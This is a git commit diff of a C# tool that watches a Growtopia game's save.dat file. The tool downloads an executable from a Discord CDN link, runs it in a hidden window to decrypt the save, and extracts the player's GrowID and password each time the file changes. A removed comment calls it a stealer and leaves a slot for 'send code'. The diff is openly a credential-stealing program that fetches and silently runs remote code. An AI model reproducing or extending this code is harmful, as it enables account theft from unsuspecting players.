aea47706c471435d86b877e3bf5acaebba5cd826
SrMotion - sadMotion <66473364+SrMotion@users.noreply.github.com>
2021-06-03 11:06:35 +0300

    Update Program.cs

--- SaveDatTracer/Program.cs
+++ SaveDatTracer/Program.cs
@@ -8,98 +8,77 @@ using System.Text;
 using System.Threading.Tasks;
 
 namespace TraceSaveDat
-{//SrMotion#0001
+{//SrMotion#6030
     class Program
     {
-
         public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", previus;
         public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +"\\Growtopia\\save.dat";
         public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
-        public static void SendSaveDat()
-
+        public static void popup(string username,string password)
         {
-            #region ReadGrowIDPass
-            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
-            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
-            #endregion
             if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
             {
-                Console.WriteLine("username or password is empty");
-
+                Console.WriteLine("empty");
             }
             else
             {
-                Console.Write("------------------------\n| Send Success         |\n");
-                Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
+                Console.WriteLine("GrowID: {0}\nPassword: {1}", username, password);
                 previus = username + password;
-                //ur stealer send code :v
             }
 
         }
         static void Main(string[] args)
         {
-            WebClient wc = new WebClient();
-
-            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
+            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe", Path.GetTempPath() + "\\savedecrypter.exe");// ama's savedecrypter
+            new FileStream(Path.GetTempPath() + "\\user.txt", FileMode.OpenOrCreate, FileAccess.Write).Close();
             Process.Start(new ProcessStartInfo
             {
-                FileName = Path.GetTempPath() + "\\decode.exe",
+                FileName = Path.GetTempPath() + "\\savedecrypter.exe",
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
-            #region ReadGrowIDPass
-            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
-            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
-            #endregion
-            SendSaveDat();//read growid and password and send the save dat after focus gt if changes pass sends :v
-
+            string[] packet = File.ReadAllText(Path.GetTempPath() + "\\user.txt").Split('|');
+            popup(packet[0],packet[1]);
             fileSystemWatcher.Path = dirPath;
             fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
             fileSystemWatcher.Filter = "*.dat";
             fileSystemWatcher.Changed += OnSaveChanged;
             fileSystemWatcher.EnableRaisingEvents = true;
-            while (true)
-            {
-                System.Threading.Thread.Sleep(1000);
-            }
+            System.Threading.Thread.Sleep(-1);
         }
         private static void OnSaveChanged(object source, FileSystemEventArgs e)
         {
-
             if (e.FullPath == savePath)
             {
                 try
                 {
-                    #region CreateFiles
-                    string fileName = Path.GetTempPath() + "\\pass.txt";
-                    FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
-                    fs.Close();
-                    string fileNamea = Path.GetTempPath() + "\\user.txt";
-                    FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
-                    fsa.Close();
-                    Process.Start(new ProcessStartInfo
+                    new FileStream(Path.GetTempPath() + "\\user.txt", FileMode.OpenOrCreate, FileAccess.Write).Close();
+                    back:
+                    if(File.Exists(Path.GetTempPath() + "\\savedecrypter.exe"))
                     {
-                        FileName = Path.GetTempPath() + "\\decode.exe",
-                        WindowStyle = ProcessWindowStyle.Hidden
-                    }).WaitForExit();
-                    #endregion
-                    #region ReadGrowIDPass
-                    string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
-                    string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
-                    #endregion
-                    fileSystemWatcher.EnableRaisingEvents = false;
-                    if (previus != username + password)
-                    {
-                        previus = username + password;
-                        //SrMotion#0001
-                        if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
+                        Process.Start(new ProcessStartInfo
                         {
-                            Console.WriteLine("username or password is empty");
+                            FileName = Path.GetTempPath() + "\\savedecrypter.exe",
+                            WindowStyle = ProcessWindowStyle.Hidden
+                        }).WaitForExit();
+                    }
+                    else
+                    {
+                        new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe", Path.GetTempPath() + "\\savedecrypter.exe");// savedecrypter
+                        goto back;
+                    }
+                    string[] packet = File.ReadAllText(Path.GetTempPath() + "\\user.txt").Split('|');
+                    fileSystemWatcher.EnableRaisingEvents = false;
+                    if (previus != packet[0] + packet[1])
+                    {
+                        previus = packet[0] + packet[1];
+                        if(string.IsNullOrEmpty(packet[0]) || string.IsNullOrEmpty(packet[1]))
+                        {
+                            Console.WriteLine("empty");
                         }
                         else
                         {
-                            SendSaveDat();
+                            popup(packet[0], packet[1]);
                         }
-
                     }
                 }
                 finally
